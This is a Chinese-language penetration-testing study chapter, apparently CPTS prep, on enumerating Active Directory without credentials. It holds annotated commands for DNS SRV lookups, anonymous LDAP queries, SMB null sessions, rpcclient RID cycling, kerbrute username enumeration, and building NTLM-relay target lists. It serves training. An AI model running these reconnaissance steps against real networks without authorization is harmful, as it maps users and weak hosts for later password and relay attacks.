# 第 72 章 - 無憑證 AD 列舉

## 標籤

- #cpts
- #chapter
- #active-directory
- #enumeration

## 學習目標

- 知道哪些協定在無帳號情況下仍可查詢 AD 資訊。
- 能從 DNS / LDAP / SMB / Kerberos 拼出網域名稱、DC IP、realm。
- 用 kerbrute 做使用者名稱列舉，為後續密碼攻擊建立清單。
- 判斷環境是否允許 NULL session 或匿名 LDAP 綁定。

---

## 理論基礎：為什麼沒有帳號也能拿到資訊

AD 依賴多個開放協定（DNS / LDAP / SMB / Kerberos），這些協定的「服務探索」設計本身就允許部分未認證查詢：

| 協定 | 為什麼有資訊 | 典型可拿到的內容 |
|------|------------|----------------|
| DNS | SRV record 公開服務位置 | DC IP、網域名稱、站點 |
| LDAP (389) | rootDSE 可匿名讀 | naming context、domain、forest |
| SMB (445) | OS discovery 不需認證 | hostname、OS、domain |
| Kerberos (88) | AS-REQ 錯誤碼不同 | 使用者是否存在（PREAUTH vs NO_USER） |
| RPC (135) | Null session 視設定而定 | 使用者清單、共享、帳號資訊 |

---

## 執行流程

```
1. DNS → 找出 DC IP 與網域名稱
2. LDAP rootDSE → 確認 naming context 與 forest
3. SMB → 確認主機名稱、OS、null session
4. kerbrute → 使用者名稱列舉
5. rpcclient / enum4linux-ng → 若 null session 開放，拿使用者/群組清單
```

---

## 工具一：DNS 枚舉

### 理論

AD 在 DNS 裡登記了 `_ldap._tcp.dc._msdcs.<domain>` 等 SRV record，讓客戶端能自動找到 DC。你可以直接查這些 record 來確認網域名稱與 DC IP。

```bash
# 查詢 DC 的 SRV record（找到網域名稱後再查）
dig SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL @DC_IP
# SRV  → 查 Service Record
# _ldap._tcp.dc._msdcs → AD 的 DC 定位記錄（固定格式）
# @DC_IP → 直接問 DC 的 DNS，避免 ISP DNS 干擾

# 正向查詢（找 DC 的 A record）
dig A dc01.DOMAIN.LOCAL @DC_IP

# 如果不知道網域，掃 445 後用 nmap 拿 smb-os-discovery，再從裡面的 Domain 欄位確認
nmap -p 53 --script dns-srv-enum --script-args "dns-srv-enum.domain=DOMAIN.LOCAL" DC_IP
# --script dns-srv-enum → 自動查各種 AD 相關 SRV 記錄
# --script-args        → 傳參數給 script
```

## 工具二：LDAP rootDSE（匿名查詢）

### 理論

LDAP rootDSE 是目錄最頂層的特殊物件，任何 LDAP 伺服器（包含 AD）都允許**匿名讀取**，因為這是讓客戶端知道「我應該怎麼連進來」的設計。

```bash
# 查詢 rootDSE（不需帳密）
ldapsearch -H ldap://DC_IP -x -b "" -s base
# -H ldap://DC_IP → 指定 LDAP server URI
# -x              → 簡單認證（匿名，不用 SASL）
# -b ""           → base DN 為空，即查根節點
# -s base         → scope = base，只查 rootDSE 本身（不展開子樹）

# 取得 naming context（找到後用它做後續查詢）
ldapsearch -H ldap://DC_IP -x -b "" -s base namingContexts
# namingContexts → 只顯示這個屬性（例如 DC=corp,DC=local）

# 用 nmap script 做同樣的事
nmap --script ldap-rootdse -p 389 DC_IP
# --script ldap-rootdse → 查詢 AD rootDSE 並格式化輸出
```

**可拿到的關鍵資訊：**
- `defaultNamingContext` → 網域的 DN（e.g. `DC=corp,DC=local`）
- `dnsHostName` → DC 的 FQDN
- `forestFunctionality` → 森林功能等級
- `domainFunctionality` → 網域功能等級

```bash
# 嘗試匿名枚舉全部物件（多數環境會拒絕，但值得試）
ldapsearch -H ldap://DC_IP -x -b "DC=corp,DC=local" "(objectClass=*)" | head -100
# -b "DC=corp,DC=local" → 從網域根開始搜
# "(objectClass=*)"     → 查所有物件（LDAP filter 語法）
```

## 工具三：SMB / NetBIOS 探測

### 理論

SMB 在建立連線時會交換主機資訊，即使沒有認證也可以拿到 OS 版本、hostname、domain。Null session（空使用者名稱）若被允許，還可以做 RPC 查詢。

```bash
# nmap SMB 探測
nmap -p 445 --script smb-os-discovery DC_IP
# --script smb-os-discovery → 取得 OS、hostname、domain、workgroup 等

# 測試 null session 是否開放
nxc smb DC_IP -u '' -p ''
# -u '' → 空使用者名稱（null session）
# -p '' → 空密碼
# 輸出 [+] 表示 null session 成功；[-] 表示被封

# crackmapexec 同樣方式
crackmapexec smb DC_IP -u '' -p ''

# enum4linux-ng（整合 RPC + SMB + LDAP 的匿名枚舉工具）
enum4linux-ng -A DC_IP
# -A → All，執行所有模組：
#      uses: users/groups/shares/os/policy/passwordpolicy/domains
enum4linux-ng -U DC_IP   # 只枚舉使用者
enum4linux-ng -G DC_IP   # 只枚舉群組
enum4linux-ng -S DC_IP   # 只枚舉共享
```

## 工具四：rpcclient（null session）

### 理論

RPC（Remote Procedure Call）是 Windows 管理的底層協定。若 null session 允許，rpcclient 可以查詢使用者、群組、SID 等，等同有了一個隻讀 AD 帳號。

```bash
# 嘗試匿名連線
rpcclient -U "" -N DC_IP
# -U "" → 空使用者名稱
# -N    → No password（不提示輸入密碼）

# 連入後的常用指令
rpcclient $> enumdomusers          # 列出所有使用者
rpcclient $> enumdomgroups         # 列出所有群組
rpcclient $> querydominfo          # 查網域基本資訊（使用者數、密碼策略）
rpcclient $> getdompwinfo          # 密碼策略（長度、複雜度要求）
rpcclient $> lookupnames administrator  # 查特定名稱的 SID
rpcclient $> lookupsids S-1-5-21-...-500  # 用 SID 查名稱（RID cycling）

# RID cycling（用 SID 暴力列舉使用者，即使 enumdomusers 被封）
# 原理：AD 每個帳號有唯一 RID（從 500 開始），可以循序查詢
for i in $(seq 500 1200); do
  rpcclient -U "" -N DC_IP -c "lookupsids S-1-5-21-DOMAIN_SID-$i" 2>/dev/null \
    | grep -v "NT_STATUS"
done
# S-1-5-21-DOMAIN_SID → 網域 SID（從 enumdominfo 取得後替換）
```

## 工具五：kerbrute 使用者名稱列舉

> 詳細用法與 LLMNR/NBT-NS 毒化攻擊見 [[72A-Kerbrute與LLMNR毒化|第 72A 章 - Kerbrute 與 LLMNR 毒化]]

### 理論

Kerberos 在 AS-REQ（認證請求）時，對「使用者存在但需要預認證」和「使用者不存在」會回傳**不同的錯誤碼**：
- 使用者存在 → `PREAUTH_REQUIRED`（需要預認證，即密碼）
- 使用者不存在 → `PRINCIPAL_UNKNOWN`

這讓我們可以在**不需要密碼**的情況下，確認使用者帳號是否存在。kerbrute 就是利用這個特性做列舉。

```bash
# 下載 kerbrute（若沒有）
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute

# 使用者名稱列舉
./kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
# userenum         → 子命令：使用者名稱列舉模式
# -d DOMAIN.LOCAL  → 目標網域（Kerberos realm）
# --dc DC_IP       → DC 的 IP（送 AS-REQ 的目標）
# [wordlist]       → 使用者名稱字典（可用 username-anarchy 生成姓名變體）

# 輸出：VALID USERNAME 表示帳號存在
# 同時也會標出 ASREPRoastable（無需預認證）帳號

# 生成名字變體字典（如果知道員工姓名）
username-anarchy --input-file names.txt --select-format first.last,flast,first_last > usernames.txt
# --input-file  → 輸入姓名清單（格式：First Last，一行一個）
# --select-format → 指定要生成的格式
#   first.last  → john.doe
#   flast       → jdoe
#   first_last  → john_doe

./kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP usernames.txt -o valid_users.txt
# -o valid_users.txt → 把有效使用者名稱存到檔案
```

## 工具六：nxc / crackmapexec 快速掃網段

```bash
# 掃整個網段確認哪些是 AD 機器
nxc smb 172.16.0.0/24
# 輸出：hostname / OS / domain / SMB signing 狀態
# SMB signing: False → 可以做 NTLM Relay

# 找出哪些機器關了 SMB signing（Relay 前置條件）
nxc smb 172.16.0.0/24 --gen-relay-list relay_targets.txt
# --gen-relay-list → 把 signing=False 的機器 IP 寫進檔案
#                    這個清單直接給 ntlmrelayx 的 -tf 用
```

## 判斷邏輯

```
無憑證時有什麼？
├── 只知道 IP（不知道 domain）
│   ├── nmap smb-os-discovery → 拿 Domain 欄位
│   └── nmap ldap-rootdse → 拿 defaultNamingContext
├── 知道 domain → kerbrute userenum 建立使用者清單
├── 445 開放 → 測 null session（nxc -u '' -p ''）
│   ├── null session 成功 → enum4linux-ng / rpcclient → 使用者/群組清單
│   └── null session 失敗 → 只能靠 DNS / LDAP rootDSE / kerbrute
└── 有使用者清單 → 轉進 Password Spraying / ASREPRoasting
```

## 速查表

```bash
# DNS：找 DC SRV record
dig SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL @DC_IP

# LDAP rootDSE：匿名查網域資訊
ldapsearch -H ldap://DC_IP -x -b "" -s base

# SMB null session 測試
nxc smb DC_IP -u '' -p ''
enum4linux-ng -A DC_IP

# RPC null session（若開放）
rpcclient -U "" -N DC_IP -c "enumdomusers"

# Kerberos 使用者列舉
./kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP usernames.txt -o valid_users.txt

# 找無 SMB signing 的機器（Relay 前置）
nxc smb 172.16.0.0/24 --gen-relay-list relay_targets.txt
```
